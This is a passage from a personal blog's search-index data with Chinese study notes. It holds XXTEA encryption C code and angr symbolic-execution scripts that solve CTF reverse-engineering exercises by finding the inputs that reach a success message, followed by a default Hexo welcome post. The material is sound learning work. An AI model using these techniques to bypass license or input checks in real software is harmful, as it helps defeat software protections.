1) /* Coding Part */ &#123; rounds = 6 + 52/n; sum = 0; z = v[n-1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) &#123; y = v[p+1]; z = v[p] += MX; &#125; y = v[0]; z = v[n-1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) /* Decoding Part */ &#123; n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125; &#125; int main() &#123; uint32_t v[2]= &#123;1,2&#125;; uint32_t const k[4]= &#123;2,2,3,4&#125;; int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); btea(v, n, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); btea(v, -n, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0; &#125; 注意！ python是大端序， 我们的C语言是小端序。所以需要转化一下。例如： 12345python:b&#x27;\\xbc\\xa5\\xce@\\xf4\\xb2\\xb2\\xe7\\xa9\\x12\\x9d\\x12\\xae\\x10\\xc8[=\\xd7\\x06\\x1d\\xdcp\\xf8\\xdc&#x27;c++:uint32_t v[6]= &#123;0x40cea5bc,0xe7b2b2f4,0x129d12a9,0x5bc810ae,0x1d06d73d,0xdcf870dc&#125;; &quot;flag&quot; 0x67616c66","categories":[{"name":"reverse","slug":"reverse","permalink":"https://feverhu.github.io/categories/reverse/"}],"tags":[{"name":"TEA","slug":"TEA","permalink":"https://feverhu.github.io/tags/TEA/"}]},{"title":"angr学习","slug":"angr学习","date":"2022-08-07T01:16:54.000Z","updated":"2022-08-07T07:14:10.445Z","comments":true,"path":"2022/08/07/angr学习/","link":"","permalink":"https://feverhu.github.io/2022/08/07/angr%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"angr学习 angr基本脚本 一、非命令行输入 1234567891011121314151617181920212223242526import angrimport sysdef Go(): path_to_binary = &quot;*****&quot; project = angr.Project(path_to_binary, auto_load_libs=False) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000 #print(project.entry) print_good_address = 0x4009E7 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入 print(solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &quot;__main__&quot;: Go() #path_to_binary = &quot;oruga&quot; #project = angr.Project(path_to_binary, auto_load_libs=False) #print(project.entry) 二、使用命令行参数情况 12345678910111213141516171819202122232425import angrimport sysimport claripydef Go(): path_to_binary = &quot;chall&quot; project = angr.Project(path_to_binary, auto_load_libs=False) #print(project.entry) argv1 = claripy.BVS(&#x27;argv1&#x27;,33*8) initial_state = project.factory.entry_state(args=[&quot;./chall&quot;, argv1]) simulation = project.factory.simgr(initial_state) print_good_address = 0x400817 simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0].solver.eval(argv1) # 打印结果 solution = solution_state.to_bytes(33,&quot;big&quot;) print(solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &quot;__main__&quot;: Go() 代替scanf： 123456789101112131415161718192021222324252627282930313233343536373839import angrimport sysimport claripydef main(argv): path_to_binary = &#x27;ROR.exe&#x27; # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, param0): scanf0 = claripy.BVS(&#x27;scanf0&#x27;, 8 * 80) scanf0_address = param0 print(scanf0_address) self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness) self.state.globals[&#x27;solutions&#x27;] = scanf0 scanf_symbol = &#x27;scanf&#x27; project.hook_symbol(scanf_symbol, ReplacementScanf()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return &#x27;Congratulations&#x27;.encode() in stdout_output simulation.explore(find=is_successful) if simulation.found: solution_state = simulation.found[0] stored_solutions = solution_state.globals[&#x27;solutions&#x27;] scanf0_solution = solution_state.solver.eval(stored_solutions) print(scanf0_solution) else: raise Exception(&#x27;Could not find the solution&#x27;)if __name__ == &#x27;__main__&#x27;: main(sys.argv) angr练习十八道 02_angr_find_condition 本题知识点：在没有地址情况下，利用字符串来确定寻找地址和规避地址。 ida： 12345678910111213def is_successful(state): # Dump whatever has been printed out by the binary so far into a string. stdout_output = state.posix.dumps(sys.stdout.fileno()) # Return whether &#x27;Good Job.&#x27; has been printed yet. # (!) return b&#x27;Good Job.&#x27; in stdout_output # :booleandef should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b&#x27;Try again.&#x27; in stdout_output # :booleansimulation.explore(find=is_successful, avoid=should_abort) 通过 stdout_output = state.posix.dumps(sys.stdout.fileno())和return b'Good Job.' in stdout_output # :boolean来判断是否到底指定情况的地址，适用于多种情况而非一个地址的情况。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://feverhu.github.io/categories/reverse/"}],"tags":[{"name":"angr","slug":"angr","permalink":"https://feverhu.github.io/tags/angr/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-07-31T06:56:59.204Z","updated":"2022-08-07T02:22:07.305Z","comments":true,"path":"2022/07/31/hello-world/","link":"","permalink":"https://feverhu.github.io/2022/07/31/hello-world/","excerpt":"","text":"感谢牛逼的hexo！自带的hello world就留着致敬吧！^_^ Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new &quot;My New Post&quot; More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[{"name":"tags","slug":"tags","permalink":"https://feverhu.github.io/tags/tags/"}]}],"categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"},{"name":"reverse","slug":"reverse","permalink":"https://feverhu.github.io/categories/reverse/"},{"name":"match","slug":"reverse/match","permalink":"https://feverhu.github.io/categories/reverse/match/"}],"tags":[{"name":"LCG","slug":"LCG","permalink":"https://feverhu.github.io/tags/LCG/"},{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"NTURE","slug":"NTURE","permalink":"https://feverhu.github.io/tags/NTURE/"},{"name":"异常处理","slug":"异常处理","permalink":"https://feverhu.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"TEA","slug":"TEA","permalink":"https://feverhu.github.io/tags/TEA/"},{"name":"angr","slug":"angr","permalink":"https://feverhu.github.io/tags/angr/"},{"name":"tags","slug":"tags","permalink":"https://feverhu.github.io/tags/tags/"}]}